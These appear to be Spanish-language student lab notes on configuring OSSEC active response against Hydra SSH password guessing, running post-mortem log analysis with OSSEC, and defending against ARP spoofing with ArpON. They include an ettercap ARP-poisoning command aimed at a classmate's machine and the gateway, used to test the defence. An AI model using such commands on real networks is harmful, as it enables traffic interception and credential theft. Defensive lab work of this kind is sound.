tail -f /var/log/auth.log                            # yo
```

Ejemplo de lo que le sale:
```bash
2025-11-04T12:09:39.806141+01:00 lucas sshd[5414]: Accepted password for lsi from 10.11.48.202 port 39624 ssh2
```

<br>

---

### **Apartado q) Reportar alarmas está muy bien, pero no estaría mejor un sistema activo, en lugar de uno pasivo. Configure algún sistema activo, por ejemplo OSSEC, y pruebe su funcionamiento ante un “password guessing”.**

> Usar OSSEC para defender a los ataques. Baneará la Ip que está realizando el ataque constantemente.

> OSSEC no tiene que defender a un número de ataques. Tiene que defender ya de primeras.

> Una vez que OSSEC funciona, hacer un flush de OSSEC y veremos todo en pantalla. Si dejamos de atacar OSSEC se para.

**Carlos nos va decir: Para OSSEC a la cuarta vez** -> Hay que hacerlo bien y explicar porque.

<br>
OSSEC es un HIDS (Host-based Intrusion Detection System, Sistema de detección de Intrusos) que monitoriza en tiempo real:

     Logs del sistema

     Integridad de archivos

     Rootkits

     Escaneo de puertos

     Fuerza bruta (password guessing)


**PASOS**:

1-Instalación:
```bash
# Descargar última versión
wget https://github.com/ossec/ossec-hids/archive/3.7.0.tar.gz
tar -xzf 3.7.0.tar.gz
cd ossec-hids-3.7.0

# Instalar dependencias
apt update
# EJECUTA ESTE COMANDO COMPLETO:
sudo apt install -y libpcre2-dev build-essential libssl-dev gcc zlib1g-dev \
    libsystemd-dev libpam-systemd systemd make autoconf automake \
    libevent-dev libcurl4-openssl-dev libxml2-dev

# Instalar OSSEC (instalación interactiva)
./install.sh
```
<br>

2-Iniciar OSSEC:
```
/var/ossec/bin/ossec-control start
```

Para verificar estado:
```bash
# Verificar estado
/var/ossec/bin/ossec-control status
```

Para reiniciar:
```bash
/var/ossec/bin/ossec-control restart
```

<br>

3-Atacar con hydra y compobar que OSSEC funciona por defecto:

El atacante hará un ataque con hydra. Con simplemente activarlo, al tercer intento va a parar. Hacemos CTRL + C dos veces para salir.
- Intento 1-2: OSSEC detecta pero no banea
- Intento 3-4: OSSEC banea la IP automáticamente

La ip del atacante se nos meterá en el hosts.deny y el Firewall durante un tiempo fijado. Esta es la respuesta activa del OSSEC la cual no podemos tocar en configuración. Simplemente iremos haciendo ataques hasta que, cuando deje de dar error, nos deje probar de nuevo varias contraseñas. Si nos vuelven a banear, está todo bien.
- IP aparece en iptables y /etc/hosts.deny

- OSSEC muestra alerta de bloqueo en logs

OSSEC por defecto SÍ bloquea, pero solo después de múltiples intentos. Funciona con un sistema de "detección acumulativa": aunque cada intento fallido de SSH es nivel 5, OSSEC incrementa el nivel cuando detecta múltiples ataques desde la misma IP. Cuando el nivel acumulado supera 6, activa el bloqueo automático en firewall y hosts.deny. Por eso Hydra al final fue bloqueada - no inmediatamente, sino tras acumular suficiente evidencia de ataque. Bloquea la IP durante 600 segundos por la parte del active response del fichero de configuración. Por defecto:

```bash
<!-- Active Response Config -->
  <active-response>
    <!-- This response is going to execute the host-deny
       - command for every event that fires a rule with
       - level (severity) >= 6.
       - The IP is going to be blocked for  600 seconds.
      -->
    <command>host-deny</command>
    <location>local</location>
    <level>6</level>
    <timeout>600</timeout>
  </active-response>

  <active-response>
    <!-- Firewall Drop response. Block the IP for
       - 600 seconds on the firewall (iptables,
       - ipfilter, etc).
      -->
    <command>firewall-drop</command>
    <location>local</location>
    <level>6</level>
    <timeout>600</timeout>
  </active-response>
```

Mi compañero hizo suficientes intentos para que OSSEC acumulara nivel ≥ 6 y activara el bloqueo automático.

Aquí están los levels de OSSEC:
```text
The rules will be read from the highest to the lowest level.

00 - Ignored - No action taken. Used to avoid false positives. These rules are scanned before all the others. They include events with no security relevance.

01 - None -

02 - System low priority notification - System notification or status messages. They have no security relevance.

03 - Successful/Authorized events - They include successful login attempts, firewall allow events, etc.

04 - System low priority error - Errors related to bad configurations or unused devices/applications. They have no security relevance and are usually caused by default installations or software testing.

05 - User generated error - They include missed passwords, denied actions, etc. By itself they have no security relevance.

06 - Low relevance attack - They indicate a worm or a virus that have no affect to the system (like code red for apache servers, etc). They also include frequently IDS events and frequently errors.

07 - “Bad word” matching. They include words like “bad”, “error”, etc. These events are most of the time unclassified and may have some security relevance.

08 - First time seen - Include first time seen events. First time an IDS event is fired or the first time an user logged in. If you just started using OSSEC HIDS these messages will probably be frequently. After a while they should go away, It also includes security relevant actions (like the starting of a sniffer or something like that).

09 - Error from invalid source - Include attempts to login as an unknown user or from an invalid source. May have security relevance (specially if repeated). They also include errors regarding the “admin” (root) account.

10 - Multiple user generated errors - They include multiple bad passwords, multiple failed logins, etc. They may indicate an attack or may just be that a user just forgot his credentials.

11 - Integrity checking warning - They include messages regarding the modification of binaries or the presence of rootkits (by rootcheck). If you just modified your system configuration you should be fine regarding the “syscheck” messages. They may indicate a successful attack. Also included IDS events that will be ignored (high number of repetitions).

12 - High importancy event - They include error or warning messages from the system, kernel, etc. They may indicate an attack against a specific application.

13 - Unusual error (high importance) - Most of the times it matches a common attack pattern.

14 - High importance security event. Most of the times done with correlation and it indicates an attack.

15 - Severe attack - No chances of false positives. Immediate attention is necessary.
```

Para ver los logs:
```bash
# Ver logs de alertas
tail -f /var/ossec/logs/alerts/alerts.log

# Ver logs completos
tail -f /var/ossec/logs/ossec.log

# Logs depurados -> para ver las alertas por su grado de criticidad (APARTADO R)
cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a |/var/ossec/bin/ossec-reportd
```

Nos debería salir 1 log por cada intento de password guessing con hydra.

Ver IPS baneadas:
```bash
# Ver reglas de firewall
iptables -L -n | grep DROP

# Ver hosts denegados
cat /etc/hosts.deny
```

Si nos pregunta que regla se está activando se encuentra en los logs (Rule -> ...):
```bash
** Alert 1762450377.25475: - syslog,sshd,authentication_failed,
2025 Nov 06 18:32:57 ismael->/var/log/auth.log
Rule: 5716 (level 5) -> 'SSHD authentication failed.'
Src IP: 10.11.48.175
User: lsi
2025-11-06T18:32:55.596486+01:00 ismael sshd[188117]: Failed password for lsi from 10.11.48.175 port 48016 ssh2
```
 
Ahí vemos Regla 5716 nivel 5. Cada SSH fallido = Level 5 (regla 5716)

**A nosotros las reglas que nos influyen son las que tienen que ver con SSH  y por tanto se encuentran en el archivo de configuración:
sshd_rules.xml (Entender como funcionan estas reglas)**.

<br>

4-Configurar para que funcione en los intentos que nosotros queramos.

Para ello hay que editar el archivo de configuración y las reglas locales:
```bash
nano /var/ossec/etc/ossec.conf
```


El archivo de reglas locales **/var/ossec/etc/rules/local_rules.xml** tiene prioridad sobre las reglas por defecto.



En ssh config:
```bash
LoginGraceTime 60
#PermitRootLogin prohibit-password
#StrictModes yes
MaxAuthTries 10
#MaxSessions 10
```

systemctl restart sshd

Si cambio algo en conf lo reinicio con:
```bash
sudo /var/ossec/bin/ossec-control restart
```

5-Después de comprobar que OSSEC funciona hacer un flush (Limpiar/Reiniciar)
```bash
# Parar OSSEC completamente
/var/ossec/bin/ossec-control stop

# Limpiar bloqueos existentes
iptables -F

# borrar a mano la línea del host.deny

# Verificar limpieza
iptables -L -n | grep DROP
cat /etc/hosts.deny
```


<br>
<br>


---

### **Apartado r) Supongamos que una máquina ha sido comprometida y disponemos de un fichero con sus mensajes de log. Procese dicho fichero con OSSEC para tratar de localizar evidencias de lo acontecido (“post mortem”). Muestre las alertas detectadas con su grado de criticidad, así como un resumen de las mismas.**

Fichero /var/ossec/bin/ossec-logtest: Aquí está toda la información. Sin embargo, está sin depurar.

- Logs depurados -> para ver las alertas por su grado de criticidad 
```bash
cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a                                       # solo sacar alertas

cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a |/var/ossec/bin/ossec-reportd         # resumen de las alertas
```

<br>

---
**ARPON**:

> IMPORTANTE: si no vamos usar arpon paramos el servicio systemctl stop arpon@ens33 y hacemos un mask systemctl mask arpon@ens33. Si dejamos el servicio activo puede tirarnos la máquina


1-Instalamos arpon:
```bash
apt install arpon
```

2-Configuramos la ruta /etc/arpon.conf. Comentamos todas las lineas que tiene el archivo y añadimos la IP-MAC de nuestro compañero, del router y la nuestra propia (para ver la MAC ejecutamos ifconfig y en la interfaz correspondente miramos o campo ether o podemos hacer arp -a y usar grep con la ip):

```bash
root@ismael:/home/lsi# arp -a | grep 10.11.48.175
? (10.11.48.175) at 00:50:56:97:29:8b [ether] on ens33

root@ismael:/home/lsi# arp -a | grep 10.11.48.202
? (10.11.48.175) at 00:50:56:97:29:8f [ether] on ens33
00:50:56:97:29:8f

root@ismael:/home/lsi# arp -a | grep "(10.11.48.1)"
_gateway (10.11.48.1) at dc:08:56:10:84:b9 [ether] on ens33
```

En mi caso añadí:
```bash
10.11.48.1       dc:08:56:10:84:b9
10.11.48.175     00:50:56:97:29:8f
```

<br>

### FUNCIONAMIENTO:

**SIN ARPON**:
- ATACANTE:
  
1º) Hacemos un arp poisoning:
```bash
ettercap -T -i ens33 -M arp:remote /10.11.48.175/// /10.11.48.1///
```

Esperar un rato

- VÍCTIMA:

1º) Ejecutar:
```bash
ip neigh flush all    # borrar ARP caché
arp -a
```

Debemos ver la MAC de atacante y la del router igual (la del ruter ahora es la de la máquina del atacante):
<img width="491" height="48" alt="imagen" src="https://github.com/user-attachments/assets/26074b6f-373e-43a9-8269-7c20afbdb5a6" />


<br>
---

**CON ARPON**

- ATACANTE (igual que antes):
  
1º) Hacemos un arp poisoning:
```bash
ettercap -T -i ens33 -M arp:remote /10.11.48.175/// /10.11.48.1///
```


<br>

- VÍCTIMA:

Encender arpon:
```bash
root@ismael:/home/lsi# systemctl start arpon@ens33
```

Solo cuando lo usemos. Cuando no se usa PARAR Y ENMASCARAR!!
```bash
root@ismael:/home/lsi# systemctl stop arpon@ens33
root@ismael:/home/lsi# systemctl disable arpon@ens33
```

Al volver a realiza el ataque, la MAC del router no cambia y la hace permanente.

Observa tail -F /var/log/arpon.log y ip neigh show.

ArpON debería rechazar/limpiar entradas ARP inconsistentes o dejar constancia en el log de la detección (según modo).

Logs del arpon:
```bash
cat /var/log/arpon/arpon.log
```

UPDATE: ¡Esto significa que 10.11.48.175 tiene la MAC del ROUTER! - ATAQUE DETECTADO
```bash
Nov 07 18:40:43 [INFO] UPDATE, 10.11.48.202 is at 0:50:56:97:29:8f on ens33
```


Borrar la tabla ARP:
```bash
ip neigh flush all
```












































































